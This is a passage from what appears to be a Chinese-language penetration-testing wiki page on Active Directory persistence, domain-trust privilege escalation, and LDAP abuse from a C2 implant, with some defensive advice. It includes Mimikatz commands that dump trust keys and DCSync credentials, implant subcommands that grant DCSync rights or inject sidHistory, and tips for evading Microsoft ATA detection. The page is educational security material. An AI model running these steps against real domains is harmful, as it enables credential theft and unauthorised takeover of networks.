ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

修改内存中的 **LSASS** 以建立一个**通用密码**，从而获得对所有域帐户的访问权。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
你可以创建你自己的 **SSP** 来**以明文捕获**用于访问机器的**凭据**。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

它在 AD 中注册一个**新的 Domain Controller**并使用它来**推送属性**（如 SIDHistory、SPNs...）到指定对象，且**不会留下有关这些修改的日志**。你**需要 DA** 权限并且位于**根域**内。\
注意，如果你使用了错误的数据，会出现相当难看的日志。


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS 持久化

之前我们讨论了如果你拥有**足够权限读取 LAPS 密码**时如何提升权限。然而，这些密码也可以被用来**维持持久化**。\
查看：


{{#ref}}
laps.md
{{#endref}}

## 林（Forest）权限提升 - 域信任

Microsoft 将 **Forest** 视为安全边界。这意味着**攻破单个域可能会导致整个 Forest 被攻破**。

### 基本信息

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) 是一种安全机制，允许来自一个**域**的用户访问另一个**域**中的资源。它本质上在两个域的认证系统之间建立了一个链接，使认证验证可以无缝流动。当域建立信任时，它们会在各自的 **Domain Controllers (DCs)** 中交换并保留某些**密钥**，这些密钥对于信任的完整性至关重要。

在典型场景中，如果用户打算访问**受信任域**中的服务，他们必须先从自己域的 DC 请求一个特殊的票证，称为 **inter-realm TGT**。该 TGT 使用双方已协商的共享**密钥**进行加密。然后用户将此 TGT 提交给**受信任域的 DC**以获取服务票证（**TGS**）。在受信任域的 DC 成功验证 inter-realm TGT 后，它会签发一个 TGS，从而授予用户对该服务的访问权限。

**步骤**：

1. **Domain 1** 中的一台**客户端计算机**使用其 **NTLM hash** 向其 **Domain Controller (DC1)** 请求 **Ticket Granting Ticket (TGT)**。
2. 如果客户端认证成功，DC1 会签发一个新的 TGT。
3. 然后客户端从 DC1 请求一个**inter-realm TGT**，这是访问 **Domain 2** 中资源所需的。
4. inter-realm TGT 使用作为双向域信任一部分在 DC1 和 DC2 之间共享的**trust key**进行加密。
5. 客户端将 inter-realm TGT 提交给 **Domain 2 的 Domain Controller (DC2)**。
6. DC2 使用其共享的 trust key 验证 inter-realm TGT，如果有效，则为客户端想要访问的 Domain 2 中的服务器签发 **Ticket Granting Service (TGS)**。
7. 最后，客户端将该 TGS 提交给服务器，该票证使用服务器帐户的 hash 加密，以访问 Domain 2 中的服务。

### 不同类型的信任

需要注意的是，**信任可以是单向或双向的**。在双向选项中，两个域将相互信任，但在**单向**信任关系中，一个域将是**被信任的域**，另一个是**信任方域**。在后一种情况下，**你只能从被信任域访问信任方域内的资源**。

如果域 A 信任域 B，则 A 为信任方域，B 为被信任域。此外，在 **Domain A** 中，这将是一个 **Outbound trust**；而在 **Domain B** 中，这将是一个 **Inbound trust**。

**不同的信任关系类型**

- **Parent-Child Trusts**：这是同一林内常见的设置，子域自动与父域建立双向可传递信任。基本上，这意味着父域和子域之间可以无缝地传递认证请求。
- **Cross-link Trusts**：称为“shortcut trusts”，这些建立在子域之间以加速引用过程。在复杂的林中，认证引用通常需要上行到林根，然后下行到目标域。通过创建 cross-links，可缩短这一过程，这在地域分散的环境中特别有用。
- **External Trusts**：这些在不同、无关的域之间建立，且本质上为非传递信任。根据 [Microsoft 的文档](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)，external trusts 对于访问不通过林信任连接的林外域中的资源非常有用。通过外部信任可以使用 SID 过滤来增强安全性。
- **Tree-root Trusts**：这些信任在林根域和新添加的 tree root 之间自动建立。虽然不常见，但 tree-root trusts 对于向林中添加新的域树很重要，使它们能够保持独特的域名并确保双向可传递性。详情可见 [Microsoft 指南](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)。
- **Forest Trusts**：这种信任是两个 forest root 域之间的双向可传递信任，同时强制执行 SID 过滤以增强安全措施。
- **MIT Trusts**：这些信任与非 Windows、符合 [RFC4120](https://tools.ietf.org/html/rfc4120) 的 Kerberos 域建立。MIT trusts 较为专业，适用于需要与 Windows 生态之外的基于 Kerberos 的系统集成的环境。

#### 关于信任关系的其他差异

- 信任关系还可以是**传递的**（A 信任 B，B 信任 C，则 A 信任 C）或**非传递的**。
- 信任关系可以设置为**双向信任**（双方互相信任）或**单向信任**（仅一方信任另一方）。

### 攻击路径

1. **枚举**信任关系
2. 检查是否有任何 **security principal**（用户/组/计算机）对**另一个域**的资源有**访问权限**，可能通过 ACE 条目或成为另一个域的组成员。查找**跨域关系**（信任可能就是为此创建的）。
1. 在这种情况下，kerberoast 也可能是另一种选项。
3. **攻破**那些可以**穿越域进行 pivot**的**账户**。

攻击者可以通过三种主要机制访问另一个域的资源：

- **本地组成员身份**：主体可能被添加到机器的本地组中，例如服务器上的 “Administrators” 组，从而授予他们对该机器的重大控制权。
- **外域组成员身份**：主体也可以成为外域内某些组的成员。然而，此方法的有效性取决于信任的性质和该组的范围。
- **访问控制列表 (ACLs)**：主体可能在 **ACL** 中被指定，尤其是作为 **DACL** 中 **ACE** 的实体，从而为他们提供对特定资源的访问权限。对于希望深入了解 ACL、DACL 和 ACE 机制的人，题为 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 的白皮书是非常有价值的资源。

### 查找具有权限的外部用户/组

你可以检查 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** 来查找域中的外部安全主体。这些将来自**外部域/林**的用户/组。

你可以在 **Bloodhound** 中检查，或使用 powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### 子林到父林的权限提升
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
枚举域信任的其他方法：
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> 存在 **2 trusted keys**，一个用于 _Child --> Parent_，另一个用于 _Parent_ --> _Child_。\
> 你可以使用下面的命令查看当前域使用的是哪一个：
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

通过 SID-History injection 滥用信任，将权限升级为 Enterprise admin 并作用于 child/parent 域：

{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

理解如何利用 Configuration Naming Context (NC) 十分关键。Configuration NC 在 Active Directory (AD) 环境中充当跨 forest 的配置数据中央存储库。这些数据会复制到 forest 中的每个 Domain Controller (DC)，可写的 DC 会保有 Configuration NC 的可写副本。要利用这一点，必须在某个 DC 上拥有 **SYSTEM privileges**，最好是 child DC。

**Link GPO to root DC site**

Configuration NC 的 Sites 容器包含 AD forest 中所有加入域的计算机所属站点的信息。通过在任一 DC 上以 SYSTEM 权限操作，攻击者可以将 GPO 链接到 root DC 的站点。此操作可能通过操纵应用于这些站点的策略来危及 root 域。

有关深入信息，可参阅研究 [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research)。

**Compromise any gMSA in the forest**

一种攻击向量是针对域内有权限的 gMSA。用于计算 gMSA 密码的 KDS Root key 存储在 Configuration NC 中。在任意 DC 上获得 SYSTEM 权限后，可以访问 KDS Root key 并计算整个 forest 中任何 gMSA 的密码。

详细分析和逐步指导可见于：

{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

补充的 delegated MSA 攻击（BadSuccessor – 滥用 migration attributes）：

{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

附加外部研究：[Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)。

**Schema change attack**

该方法需要耐心，等待新的有权限的 AD 对象被创建。拥有 SYSTEM 权限后，攻击者可以修改 AD Schema，从而授予任意用户对所有类的完全控制权。这可能导致对新创建的 AD 对象的未授权访问和控制。

更多阅读请参见 [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent)。

**From DA to EA with ADCS ESC5**

ADCS ESC5 漏洞针对对 Public Key Infrastructure (PKI) 对象的控制，通过创建一个证书模板，使得可以以 forest 中任意用户的身份进行认证。由于 PKI 对象位于 Configuration NC 中，攻破可写的 child DC 后就能实施 ESC5 攻击。

更多细节见 [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c)。在没有 ADCS 的场景中，攻击者也可以按照讨论搭建必要组件，详见 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)。

### 外部 forest 域 - 单向（入站）或双向
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
在这种场景中，**你的域被外部域所信任**，从而赋予你对其**未确定的权限**。你需要找出**你域中的哪些主体对外部域拥有何种访问权限**，然后尝试利用它：

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部 Forest 域 - 单向（出站）
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
在这种情景下，**你的域** 正在向来自 **不同域** 的主体 **授予** 某些 **权限**。

然而，当一个**域被信任**由信任域时，受信任域会**创建一个用户**，该用户具有**可预测的名称**，并使用**受信任密码**作为密码。这意味着可以**使用来自信任域的用户访问受信任域**，对其进行枚举并尝试进一步提升权限：

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

另一种破坏受信任域的方法是找到在域信任的**相反方向**创建的[**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)（这并不常见）。

另一种破坏受信任域的方法是驻留在一台机器上，等待**来自受信任域的用户可以通过 RDP 登录**。然后，攻击者可以在 RDP 会话进程中注入代码，并从那里**访问受害者的原始域**。此外，如果**受害者已挂载其硬盘**，攻击者可以从**RDP 会话**进程在硬盘的**启动文件夹**中存放**后门**。该技术称为 **RDPInception。**

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### 域信任滥用缓解

### **SID Filtering:**

- 利用 SID history 属性跨林信任发动攻击的风险可通过 SID Filtering 缓解，SID Filtering 在所有 inter-forest trusts 上默认启用。其前提是假设 intra-forest trusts 是安全的，即将 forest 而非 domain 视为安全边界，这是 Microsoft 的立场。
- 不过有个问题：SID Filtering 可能会中断应用程序和用户访问，因此有时会被禁用。

### **Selective Authentication:**

- 对于 inter-forest trusts，使用 Selective Authentication 可确保来自两个 forests 的用户不会被自动认证。相反，用户需要被显式授予权限才能访问信任域或林内的域与服务器。
- 需要注意的是，这些措施无法防止可写的 Configuration Naming Context (NC) 被利用，或对信任帐户的攻击。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## 来自主机植入物的基于 LDAP 的 AD 滥用

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) 将 bloodyAD-style LDAP 原语重新实现为 x64 Beacon Object Files，完全在主机植入物（例如 Adaptix C2）内运行。操作员用 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` 编译该包，加载 `ldap.axs`，然后从 beacon 调用 `ldap <subcommand>`。所有流量都在当前登录的安全上下文下通过 LDAP (389)（with signing/sealing）或 LDAPS (636)（with auto certificate trust）传输，因此无需 socks proxies 或磁盘痕迹。

### 植入端 LDAP 枚举

- `get-users`、`get-computers`、`get-groups`、`get-usergroups` 和 `get-groupmembers` 将简短名称/OU 路径解析为完整的 DNs，并转储相应对象。
- `get-object`、`get-attribute` 和 `get-domaininfo` 从 `rootDSE` 提取任意属性（包括 security descriptors）以及 forest/domain 元数据。
- `get-uac`、`get-spn`、`get-delegation` 和 `get-rbcd` 直接从 LDAP 暴露 roasting candidates、delegation settings，以及现有的 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) 描述符。
- `get-acl` 和 `get-writable --detailed` 解析 DACL，列出 trustees、权限（GenericAll/WriteDACL/WriteOwner/attribute writes）和继承信息，为 ACL 权限提升提供直接目标。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) 让操作者在具有 OU 权限的任何位置暂放新的主体或计算机帐户。`add-groupmember`, `set-password`, `add-attribute`, and `set-attribute` 在发现 write-property 权限后会直接劫持目标。
- 以 ACL 为重点的命令（如 `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, 和 `add-dcsync`）将 WriteDACL/WriteOwner 在任何 AD 对象上的权限转换为密码重置、组成员控制或 DCSync 复制权限，并且不会留下 PowerShell/ADSI 痕迹。`remove-*` 对应命令可清理注入的 ACEs。

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` 会立即使被攻陷的用户可被 Kerberoast；`add-asreproastable`（UAC 切换）会在不触碰密码的情况下将其标记为可进行 AS-REP roasting。
- Delegation 宏（`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`）可以从 beacon 重写 `msDS-AllowedToDelegateTo`、UAC 标志或 `msDS-AllowedToActOnBehalfOfOtherIdentity`，启用 constrained/unconstrained/RBCD 攻击路径，并消除了对远程 PowerShell 或 RSAT 的需求。

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` 将特权 SID 注入受控主体的 SID history（参见 [SID-History Injection](sid-history-injection.md)），通过 LDAP/LDAPS 提供隐蔽的访问继承。
- `move-object` 更改计算机或用户的 DN/OU，允许攻击者在滥用 `set-password`、`add-groupmember` 或 `add-spn` 之前将资产拖入已有委派权限的 OU。
- 作用域严格的移除命令（`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, 等）允许操作者在收集凭证或持久化后快速回滚，从而最小化遥测。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **凭证保护的防御措施**

- **Domain Admins Restrictions**: 建议 Domain Admins 仅允许登录到 Domain Controllers，避免在其他主机上使用。
- **Service Account Privileges**: 服务不应以 Domain Admin (DA) 权限运行以维持安全性。
- **Temporal Privilege Limitation**: 对于需要 DA 权限的任务，应限制其持续时间。可以通过：`Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)` 来实现。
- **LDAP relay mitigation**: 审计事件 ID 2889/3074/3075，然后在 DCs/客户端上强制启用 LDAP signing 以及 LDAPS channel binding，以阻止 LDAP MITM/relay 企图。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- 实施欺骗涉及设置诱饵（比如诱饵用户或计算机），并赋予诸如密码永不过期或被标记为 Trusted for Delegation 等特性。具体做法包括创建具有特定权限的用户或将其添加到高权限组中。
- 一个实际示例使用的命令例如：`Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- 有关部署欺骗技术的更多信息，请参见 [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception)。

### **Identifying Deception**

- **For User Objects**: 可疑指标包括异常的 ObjectSID、极少的登录次数、创建日期异常，以及较低的错误密码计数。
- **General Indicators**: 将疑似诱饵对象的属性与真实对象进行比较可以揭示不一致之处。工具如 [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 可帮助识别此类欺骗。

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: 避免在 Domain Controllers 上进行会话枚举以防触发 ATA 检测。
- **Ticket Impersonation**: 使用 **aes** 密钥创建票据有助于规避检测，因为这样不会降级到 NTLM。
- **DCSync Attacks**: 建议从非域控制器执行以避免 ATA 检测；直接从域控制器执行会触发告警。

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
